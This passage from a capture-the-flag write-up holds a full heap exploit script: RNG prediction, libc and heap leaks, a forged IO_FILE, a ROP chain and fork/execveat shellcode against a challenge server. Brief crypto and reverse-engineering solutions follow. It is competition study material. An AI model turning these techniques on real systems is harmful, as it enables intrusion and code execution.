def exhaust(start,end):
    global buffill, fillcnt
    allres = []
    for i in range(start,end):
        print('>',i)
        guess(i,currand[i],0x20,'M30W')
        if buffill>0x1000:
            fillcnt+=1
            cnt = 0
            res = b''
            while cnt!=0x1000:
                res+=r.recv(0x1000-cnt)
                cnt=len(res)
            buffill-=0x1000
            allres.append(res)
    return allres

###Addr
stdout_struct_offset = 0x1ec6a0
stdout_readptr_offset = stdout_struct_offset+8
mmap_page_offset = 0x216000
main_arena_offset = 0x1ebb80
unsorted_bin_offset = main_arena_offset+0x60
malloc_hook_offset = 0x1ebb70
IO_str_jumps_offset = 0x1ed560

###ROPgadget
L_nop = 0x3491f
L_pop_rdi = 0x26b72
L_pop_rsi = 0x27529
L_pop_rdx_rbx = 0x162866
L_pop_rax = 0x4a550
L_inc_rax = 0xd2c70
L_syscall = 0x66229
L_trampoline = 0x154930
L_setcontext = 0x580dd

###Exploit
T = libc.time(0)+5
while True:
    print(T)
    libc.srand(T)
    seenaddr = set()

    Arand = []
    tokill = -1
    for i in range(30):  #manageable within timeout
        collision, rands = batchgen()
        Arand.append(rands)
        if collision:
            tokill = i
            break
    if tokill!=-1:
        break
    T+=1

print(f'now time : {libc.time(0)}')
print(f'target time : {T}')
print(f'rounds : {tokill}')
while True:
    if libc.time(0)==T:
        r = remote('111.186.59.32',60001)
        break

print('start!')
print(tokill)

fillcnt = 0
buffill = 0

currand = Arand[0]
guess(0,currand[0],0x20,'M30W')
guess(1,currand[1],0x3f0,'M30W')

if tokill!=0:
    exhaust(2,0x400)

for i in range(1,tokill):
    print(i)
    currand = Arand[i]
    exhaust(0,0x400)

currand = Arand[-1]

start = 0
while buffill<0x10 or buffill>0xf00:
    guess(start,currand[start],0x20,'M30W')
    start+=1
val = u32(b'unbelievable\nunbelievable\n'[(fillcnt*0x1000)%13:][:4])
guess((stdout_readptr_offset-mmap_page_offset)//8,val,0x20,'M30W')

if buffill<0x600:
    print('!!!')
    required = (0x600-buffill)//13+1+start
    exhaust(start,required)
    start = required


guess(start,currand[start],0x250,'M30W')
start+=1
required = (0x1000-buffill)//13+1+start
leaks = exhaust(start,required)[0]
heap_addr = u64(leaks[0x8:0x10])-0x10
print(hex(heap_addr))
unsorted_bin_addr = u64(leaks[0x260:0x268])
libc_base = unsorted_bin_addr-unsorted_bin_offset
print(hex(libc_base))


start = required
guess(start,currand[start],0x300,'M30W')
guess(start+1,currand[start+1],0x360,'M30W')
guess(start+2,currand[start+2],0x380,'M30W')
guess(start+3,currand[start+3],0x390,'M30W')
start+=4

val = u32(b'unbelievable\nunbelievable\n'[(fillcnt*0x1000)%13:][:4])
guess((stdout_readptr_offset-mmap_page_offset)//8,val,0x20,'M30W')
required = (0x1300-buffill)//13+1+start
exhaust(start,required)
start = required
val = u32(b'unbelievable\nunbelievable\n'[(fillcnt*0x1000)%13:][:4])
guess((stdout_readptr_offset-mmap_page_offset)//8,val,0x20,'M30W')


guess(start,-1,0x250,p64(heap_addr+0x10))   #fail1

fakeframe = p64(0)*3+p64(libc_base+L_setcontext)+\
            p64(0)*16+\
            p64(heap_addr+0xc8d0+0xb0)+p64(libc_base+L_nop)
ROPchain = p64(libc_base+L_pop_rdi)+p64(heap_addr+0xc000)+\
           p64(libc_base+L_pop_rsi)+p64(0x1000)+\
           p64(libc_base+L_pop_rdx_rbx)+p64(7)+p64(0)+\
           p64(libc_base+L_pop_rax)+p64(9)+\
           p64(libc_base+L_inc_rax)+\
           p64(libc_base+L_syscall)+\
           p64(heap_addr+0xc8d0+0xb0+0x60)
shellcode = asm(f'''
                 mov rax, 57
                 syscall
                 cmp rax, 0
                 jne PARENT

                 CHILD:
                     mov rsi, {heap_addr+0xc8d0+0xb0+0x60+0x70}
                     mov rdx, {heap_addr+0xc8d0+0xb0+0x60+0x88}
                     jmp EXECVEAT

                 PARENT:
                     mov rdi, 0
                     mov rsi, {heap_addr}
                     mov rdx, 0x100
                     mov rax, 0
                     syscall

                     mov rsi, {heap_addr+0xc8d0+0xb0+0x60+0x78}
                     mov rdx, {heap_addr+0xc8d0+0xb0+0x60+0x98}

                 EXECVEAT:
                     xor rdi, rdi
                     xor r10, r10
                     xor r8, r8
                     mov rax, 322
                     syscall
                 ''')
arguments = b'/bin/ls\x00'+\
            b'/bin/cat\x00\x00\x00\x00\x00\x00\x00\x00'+\
            p64(heap_addr+0xc8d0+0xb0+0x60+0x70)+p64(0)+\
            p64(heap_addr+0xc8d0+0xb0+0x60+0x78)+p64(heap_addr)+p64(0)
payload = fakeframe+ROPchain+shellcode.ljust(0x70,b'\x00')+arguments
guess(start,-1,0x250,payload)     #fail2

guess(start,currand[start],0x250,(p16(0)*0x10+p16(1)+p16(1)).ljust(0x80,b'\x00')+p64(0)*0x10+p64(libc_base+stdout_struct_offset)+p64(libc_base+malloc_hook_offset))  #succeed

IO_file = IO_FILE_plus(arch=64)
stream = IO_file.construct(flags=0xfbad2082,
                           write_ptr=heap_addr+0xc8d0,
                           lock=heap_addr,
                           vtable = libc_base+IO_str_jumps_offset-0x20)

payload = stream+p64(0)+p64(libc_base+stdout_struct_offset)
guess(start+1,-1,0x110,payload)     #fail3

payload = p64(libc_base+L_setcontext)

guess(start+1,-1,0x120,payload)     #fail4+trigger

while True:
    res = r.recvline()
    if b'flag' in res:
        break
    continue
    res = input('continue : ')
    if res=='n':
        break
r.send(res.strip()+b'\x00')
r.interactive()


###NOTE  tcache ptr somewhere at page before libc
###NOTE: seems like stdout is only possible leak
```

## Crypto

### Checkin

exponent by squaring + finding a fast processor

```c=
#include <gmp.h>
#include <stdio.h>
#include <assert.h>

int main(int argc, char **argv, char **envp){
  setvbuf(stdin,NULL,2,0);

  mpz_t g;
  int ee;
  mpz_t n;

  ee = atoi(argv[1]);

  mpz_init(n);
  mpz_set_ui(n,0);
  mpz_set_str(n,argv[2], 10);

  mpz_init(g);
  mpz_set_ui(g,2);

  for(int i=0;i<ee;i++){
    mpz_mul(g,g,g);
    mpz_mod(g,g,n);
  }

  mpz_out_str(stdout,10,g);
  putchar('\n');

  return 0;
}
```

```python=
from pwn import *
import subprocess

r = remote('111.186.59.11',16256)
chall = r.recvuntil('?').decode()
ee = chall.split('^')[2].split(')')[0]
n = chall.split(' mod ')[1].split(' = ')[0]

res = subprocess.getoutput(f'./test {ee} {n}')
print(res)

r.send(res)
r.recvline()
r.interactive()
print(r.recvline())
print(ee)
print(res)
```


## reverse

### vp

1. Skyscrapers puzzle


We need to solve a skyscrapers puzzle in this chall

We use this [tool](https://github.com/dferri/z3-skyscrapers) to generate contraints. Then we can use z3 to get the answer

2. Get flag

Once you get the answer, you can overwrite two bytes on the stack. By overwriting the return address, we can get the flag

`flag{vvvvvfork_is_good_to_play_a_skycraper^.^}`
